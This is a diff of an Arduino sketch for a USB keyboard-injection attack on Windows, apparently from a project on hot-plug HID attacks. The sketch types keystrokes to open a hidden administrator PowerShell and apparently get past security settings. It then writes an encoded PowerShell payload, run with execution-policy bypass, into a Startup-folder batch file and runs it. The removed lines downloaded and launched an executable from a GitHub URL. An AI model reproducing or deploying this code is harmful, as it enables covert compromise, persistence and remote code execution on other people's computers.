@@ -1,16 +1,100 @@
 #include "Keyboard.h"
 void setup() {
-  Keyboard.begin();
+  
+  bypass();
 
-// Début du script PowerShell
+  delay(100);
+
   powershell();
 
-  download();
+  delay(1000);
 
+  createfile();
+  //command
+  payload();
+  delay(100);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(100);
+  Keyboard.print("Set-Content -Path $batFilePath -Value $batContent");
+  delay(100);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(200);
+  Keyboard.print("\Start-Process -FilePath \"C:\\Users\\theob\\AppData");
+  delay(100);
+  Keyboard.print("\\Roaming\\Microsoft\\Windows");
+  delay(100);
+  Keyboard.print("\\Start Menu\\Programs");
+  delay(100);
+  Keyboard.print("\\Startup\\script.bat\" -Wait");
+  delay(100);
+  delay(100);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  Keyboard.releaseAll();
 
+  // Fermer le clavier virtuel.
+  Keyboard.end();
 
+}
 
-  delay(8000);
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
+
+void createfile(){
+  
+  Keyboard.print("$batFilePath = \"C:\\Users\\theob\\AppData");
+    delay(100);
+  Keyboard.print("\\Roaming\\Microsoft\\Windows");
+    delay(100);
+  Keyboard.print("\\Start Menu\\Programs");
+    delay(100);
+  Keyboard.print("\\Startup");
+    delay(100);
+  Keyboard.print("\\script.bat\"");
+    delay(100);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+   //early of command
+  Keyboard.print("$batContent = \"powershell -ep bypass -e ");
+  delay(100);
+ 
+}
+
+void powershell(){
+   // Simuler la pression de la touche Windows.
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll(); // Relâcher toutes les touches.
+
+  // Attendre que la boîte de dialogue Exécuter s'ouvre.
+  delay(80);
+
+  // Taper "powershell" puis appuyer sur Ctrl+Shift+Entrée pour ouvrir PowerShell en tant qu'administrateur.
+  Keyboard.print("powershell -WindowStyle Hidden");
+  delay(100);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+
+  Keyboard.releaseAll();
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_ARROW); 
+  Keyboard.release(KEY_LEFT_ARROW);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  Keyboard.releaseAll();
+}
+
+void bypass(){
+  Keyboard.begin();
+  delay(500);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
@@ -21,27 +105,6 @@ void setup() {
   delay(1000);
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
-  delay(100);
-
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  for(int i = 0; i < 4; i++){
-    Keyboard.press(KEY_TAB);
-    Keyboard.release(KEY_TAB);
-    delay(100);
-  }
-  Keyboard.press(KEY_SPACE);
-  Keyboard.release(KEY_SPACE);
-  delay(100);
-  //lancement de la combinaison de touche
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  Keyboard.press('f');
-  delay(100);
-  Keyboard.releaseAll();
-
-  return 0;
   delay(100);
   for(int i = 0; i < 4; i++){
   
@@ -67,63 +130,15 @@ void setup() {
   delay(500);
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
-  delay(100);
+  delay(200);
 
 
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);
   Keyboard.releaseAll();
-
-  delay(100);
-
-  powershell();
-
-  Keyboard.print("$batFilePath = \"C:\\Users\\theob\\AppData");
-    delay(100);
-  Keyboard.print("\\Roaming\\Microsoft\\Windows");
-    delay(100);
-  Keyboard.print("\\Start Menu\\Programs");
-    delay(100);
-  Keyboard.print("\\Startup");
-    delay(100);
-  Keyboard.print("\\script.bat\"");
-    delay(100);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-   //early of command
-  Keyboard.print("$batContent = \"powershell -ep bypass -e ");
-  delay(100);
-  //command
-  payload();
-  delay(100);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  delay(200);
-  Keyboard.print("Start-Process -FilePath \"C:\\Users\\theob\\AppData");
-  delay(100);
-  Keyboard.print("\\Roaming\\Microsoft\\Windows");
-  delay(100);
-  Keyboard.print("\\Start Menu\\Programs");
-  delay(100);
-  Keyboard.print("\\Startup\\script.bat\" -Wait");
-  delay(100);
-  delay(100);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  Keyboard.releaseAll();
-
-  // Fermer le clavier virtuel.
-  Keyboard.end();
-
-}
-
-void loop() {
-  // put your main code here, to run repeatedly:
-
 }
 
 void payload(){
-  Keyboard.print("powershell -ep bypass -e ");
   delay(50);
   Keyboard.print("UwB0AGEAcgB0AC0");
   delay(50);
@@ -329,92 +344,4 @@ void payload(){
   delay(50);
   Keyboard.print("AZABlAG4A\"");
   
-}
-
-
-void powershell(){
-   Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  delay(100);
-  Keyboard.releaseAll(); // Relâcher toutes les touches.
-
-  // Attendre que la boîte de dialogue Exécuter s'ouvre.
-  delay(80);
-
-  // Taper "powershell" puis appuyer sur Ctrl+Shift+Entrée pour ouvrir PowerShell en tant qu'administrateur.
-  Keyboard.print("powershell");
-  delay(100);
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  Keyboard.press(KEY_RETURN);
-  delay(100);
-
-  Keyboard.releaseAll();
-  delay(1000);
-
-  Keyboard.press(KEY_LEFT_ARROW); 
-  Keyboard.release(KEY_LEFT_ARROW);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(1000);
-}
-
-
-void download(){
-  delay(100);
-
-// Définir l'URL pour le téléchargement
-Keyboard.print("$url = 'https://raw.githubusercontent.com/Stalagtik/");
-delay(100);
-Keyboard.print("Hot-plug-et-attaques-hid/master/window.exe'; ");
-delay(100);
-
-// Définir le chemin local du fichier en utilisant des guillemets doubles
-Keyboard.print("$localPath = \"$env:APPDATA\\window.exe\"; ");
-delay(100);
-
-// Télécharger le fichier
-Keyboard.print("Invoke-WebRequest -Uri $url -OutFile $localPath; ");
-delay(100);
-
-// Début de la boucle while
-Keyboard.print("while ($true) { ");
-delay(100);
-
-// Vérification si une touche est appuyée
-Keyboard.print("if ([console]::KeyAvailable) { ");
-delay(100);
-
-// Lecture de la touche appuyée
-Keyboard.print("$key = [System.Console]::ReadKey($true); ");
-delay(100);
-
-// Vérification de la combinaison de touches
-Keyboard.print("if ($key.Modifiers -eq 'Control,Alt,Shift' -and $key.Key -eq 'F') { ");
-delay(100);
-
-// Exécuter le fichier
-Keyboard.print("Start-Process -FilePath $localPath; ");
-delay(100);
-
-// Sortir de la boucle
-Keyboard.print("break; ");
-delay(100);
-
-// Fermeture des blocs if et while
-Keyboard.print("} } ");
-delay(100);
-
-// Pause dans la boucle
-Keyboard.print("Start-Sleep -Milliseconds 100; ");
-delay(100);
-
-// Fin de la boucle while
-Keyboard.print("} ");
-delay(100);
-
-// Exécution de la commande
-Keyboard.press(KEY_RETURN);
-Keyboard.release(KEY_RETURN);
 }
